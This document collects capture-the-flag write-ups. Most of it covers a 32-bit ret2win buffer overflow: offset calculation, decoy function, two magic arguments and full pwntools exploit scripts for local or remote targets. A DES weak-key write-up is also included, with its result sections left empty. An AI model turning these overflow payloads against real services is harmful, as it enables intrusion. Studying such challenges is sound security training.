It’s a straight ret2win. `vuln()` uses `gets()` on a buffer at `[ebp-0x6c]`, and the saved return address is 112 bytes later. The real target is `win` at `0x08049284`, and it checks two stack arguments:

- `0xcafebebe`
- `0x13371337`

So the payload is:

```python
b"A"*112 +
p32(0x08049284) +
p32(0x41414141) +
p32(0xcafebebe) +
p32(0x13371337)
```

That works against the remote and prints the flag above.

MAGIC Number
#!/usr/bin/env python3
from pwn import *
import re

context.binary = ELF("/home/parth/HACK/magicnumber", checksec=False)
context.arch = "i386"

OFFSET = 112
WIN = 0x08049284
MAGIC1 = 0xCAFEBEBE
MAGIC2 = 0x13371337


def start():
    if args.REMOTE:
        host = args.HOST or "127.0.0.1"
        port = int(args.PORT or 31337)
        return remote(host, port)

    return process(context.binary.path)


def build_payload():
    # i386 cdecl: ret into win, then place a dummy return and the two args.
    return flat(
        b"A" * OFFSET,
        WIN,
        0x41414141,
        MAGIC1,
        MAGIC2,
    )


def main():
    io = start()
    io.recvuntil(b"Please enter your authentication string: ")
    io.sendline(build_payload())

    data = io.recvall(timeout=2)
    print(data.decode("latin-1", errors="replace"))

    match = re.search(rb"flag\{[^}]+\}", data)
    if match:
        log.success(f"flag = {match.group().decode()}")


if __name__ == "__main__":
    main()
---
# DES Weak Key Writeup

## 1. What we were given

We were told to use only two files:

- `/media/sf_kali/legacy_tool.py`
- `/media/sf_kali/output.txt`

The goal was to recover the hidden flag in the format `flag{...}`.

## 2. Read the Python script carefully

The important part of `legacy_tool.py` is:

```python
from Crypto.Cipher import DES
import base64
from FLAG import flag

def pad(plaintext):
    while len(plaintext) % 8 != 0:
        plaintext += "*"
    return plaintext

def enc(plaintext, key):
    cipher = DES.new(key, DES.MODE_ECB)
    return base64.b64encode(cipher.encrypt(plaintext))

key = "E1############".decode("hex")
plaintext = pad(flag)
print(enc(plaintext, key))
```

From this, we can extract several useful facts:

- The cipher used is `DES`.
- The mode is `ECB`.
- The plaintext is padded with `*` until its length is a multiple of 8.
- The encrypted output is Base64-encoded.
- The key is not truly random.
- The comment says the intern picked something easy to type from memory.

## 3. Why the key clue matters

DES is an old 56-bit symmetric cipher. A normal random DES key would still be annoying to guess directly.

But the script gives us a big hint:

- the key starts with `E1`
- the rest was hidden as `############`
- the comment says it was something easy to remember and type

That suggests the key may come from a known weak or human-friendly DES key pattern instead of a random value.

## 4. Look at the ciphertext

`output.txt` contains:

```text
0twztnSUTZA6vaFHQwgJjSNymcnnMQctv40qp7mMkCoOvtiJPqLR45rWRVPnkIWoATOprxd5dnY=
```

Since the script uses `base64.b64encode(...)`, the first step is to Base64-decode this value to get the raw DES ciphertext.

## 5. Use the structure of DES keys

The visible key string in the source is only 14 hex characters long:

```text
E1############
```

That matches **56 bits**, which is the effective key size of DES.

This is a strong hint that the challenge wants us to think about DES weak keys in their raw 56-bit form.

## 6. Try DES weak and semi-weak keys

DES has a small set of famous weak and semi-weak keys. These are well-known because they make DES behave badly and are never safe to use.

One of the classic weak DES keys is:

```text
E0E0E0E0F1F1F1F1
```

If we remove the DES parity bits and look only at the raw 56-bit value, it becomes:

```text
E1C3870F1E3C78
```

Notice how this starts with `E1`, which matches the clue in `legacy_tool.py`.

That makes it a very strong candidate.

## 7. Decrypt the ciphertext with that weak key

Using the weak DES key:

```text
E0E0E0E0F1F1F1F1
```

and decrypting the Base64-decoded ciphertext gives:


The trailing `*` characters are expected because the script pads the plaintext using `*`.

## 8. Remove the padding

The real flag is the decrypted message without the padding:

## 9. Final flag


## 10. Short conclusion

This challenge was not about brute-forcing all DES keys.

It was about noticing:

- the script explicitly uses DES
- the shown key length matches DES's 56-bit effective key size
- the comment says the key was something easy to type
- the visible `E1` prefix matches the raw form of a classic DES weak key

So the intended weakness was not the ciphertext itself, but the intern's terrible key choice.

---
# magicnumber writeup

## Challenge idea

This is a classic `ret2win` challenge with one extra twist:

- there is a stack buffer overflow
- there are **two magic numbers** that must be passed as arguments
- there is also a **fake win** function meant to distract you

The real target is `win()`, not `fake_win()`.

---

## Quick result

Final payload layout:

```python
b"A" * 112
+ p32(0x08049284)   # win
+ p32(0xdeadbeef)   # fake return after win
+ p32(0xcafebebe)   # first magic number
+ p32(0x13371337)   # second magic number
```

---

## 1. Initial recon

Start with basic checks:

```bash
file magicnumber
checksec --file=magicnumber
strings -a magicnumber
nm -n magicnumber
objdump -d -Mintel magicnumber
```

Important things we learn:

- the binary is **32-bit**
- **No PIE**, so function addresses are fixed
- **No canary**
- it uses `gets()`, so there is a direct stack overflow
- symbols are present, including:
  - `fake_win`
  - `win`
  - `vuln`

Relevant symbol addresses:

```text
fake_win = 0x08049244
win      = 0x08049284
vuln     = 0x08049356
```

---

## 2. Find the bug

Disassembly of `vuln()` shows the overflow:

```asm
0x0804938c: lea    eax,[ebp-0x6c]
0x08049390: call   gets@plt
```

So `gets()` writes user input into a stack buffer at:

```text
[ebp - 0x6c]
```

That means we can overwrite everything after that buffer, including the saved return address.

---

## 3. Find the offset

The buffer starts at:

```text
ebp - 0x6c
```

Saved return address is at:

```text
ebp + 0x4
```

Distance:

```text
0x6c + 0x4 = 0x70 = 112 bytes
```

So the offset to control EIP is:

```text
112
```

---

## 4. Avoid the trap

There is a `fake_win()` function:

```text
0x08049244 <fake_win>
```

That is a decoy.

The real function is:

```text
0x08049284 <win>
```

---

## 5. Recover the two magic numbers

Inside `win()` there are two comparisons:

```asm
cmpl   $0xcafebebe,0x8(%ebp)
cmpl   $0x13371337,0xc(%ebp)
```

So the function expects:

- first argument: `0xcafebebe`
- second argument: `0x13371337`

Because this is 32-bit `cdecl`, after jumping to `win()` the stack must look like this:

```text
[ win return address ]
[ first argument      ] = 0xcafebebe
[ second argument     ] = 0x13371337
```

That means after overwriting EIP with the address of `win()`, we place:

1. any dummy return address
2. first magic number
3. second magic number

---

## 6. Final exploit strategy

We overflow the buffer and replace the saved return address with `win()`.

Payload:

```python
payload  = b"A" * 112
payload += p32(0x08049284)   # win
payload += p32(0xdeadbeef)   # dummy return
payload += p32(0xcafebebe)   # arg1
payload += p32(0x13371337)   # arg2
```

When `vuln()` returns, execution goes into `win()`, and the two magic checks succeed.

If the remote service has the real `flag.txt`, it should print the real flag.

---

## 7. Ready exploit script

File: [exploit.py](/home/parth/HACK/exploit.py)

It supports:

- local run: `python3 exploit.py`
- remote run: `python3 exploit.py HOST PORT`

Main logic:

```python
payload = flat(
    b"A" * 112,
    p32(0x08049284),
    p32(0xDEADBEEF),
    p32(0xCAFEBEBE),
    p32(0x13371337),
)
```

---

## 8. Steps to perform when nc is live

If they give you something like:

```bash
nc challenge.host 31337
```

do this instead:

```bash
python3 exploit.py challenge.host 31337
```

### Full steps

1. Keep `magicnumber` and `exploit.py` in the same directory.
2. Make sure `pwntools` is installed:

```bash
python3 -m pip install pwntools
```

3. Run the exploit with the host and port from the challenge:

```bash
python3 exploit.py HOST PORT
```

4. The script will wait for:

```text
Please enter your authentication string:
```

5. It sends the payload automatically.
6. If the service is the intended one, `win()` should execute and print the real flag.

---

## 9. Manual one-liner option

If you want to test manually without the script:

```bash
python3 -c 'from pwn import *; print((b"A"*112 + p32(0x08049284) + p32(0xdeadbeef) + p32(0xcafebebe) + p32(0x13371337)).decode("latin-1"))'
```

Usually the script is safer and easier than copy-pasting raw bytes into `nc`.

---

## 10. Why this works

`vuln()` uses `gets()` on a stack buffer, so input length is unchecked.

After `112` bytes, we control the saved return address. Since the binary has:

- no stack canary
- no PIE

we can reliably return into the fixed address of `win()`.

Because `win()` checks two stack arguments, we place them exactly where a normal 32-bit function call would expect them.

---

## 11. Important note

Locally, this binary may print:

```text
No Local flag.txt.
```

That only means your local directory does not have the flag file used by the challenge author.

On the real remote service, the same exploit should print the real flag if the setup matches the binary.

---

## Final answer

- offset: `112`
- real target: `0x08049284` (`win`)
- fake target to ignore: `0x08049244` (`fake_win`)
- magic 1: `0xcafebebe`
- magic 2: `0x13371337`

Exploit formula:

```python
b"A"*112 + p32(win) + p32(dummy_ret) + p32(0xcafebebe) + p32(0x13371337)
```

---
from pwn import *
import sys


context.binary = ELF("./magicnumber", checksec=False)
context.arch = "i386"
context.os = "linux"


OFFSET = 112
WIN = 0x08049284
MAGIC1 = 0xCAFEBEBE
MAGIC2 = 0x13371337


def build_payload():
    return flat(
        b"A" * OFFSET,
        p32(WIN),
        p32(0xDEADBEEF),  # fake return address after win()
        p32(MAGIC1),
        p32(MAGIC2),
    )


def start():
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = int(sys.argv[2])
        return remote(host, port)
    return process(context.binary.path)


def main():
    io = start()
    payload = build_payload()

    io.sendlineafter(b"Please enter your authentication string: ", payload)
    io.interactive()


if __name__ == "__main__":
    main()
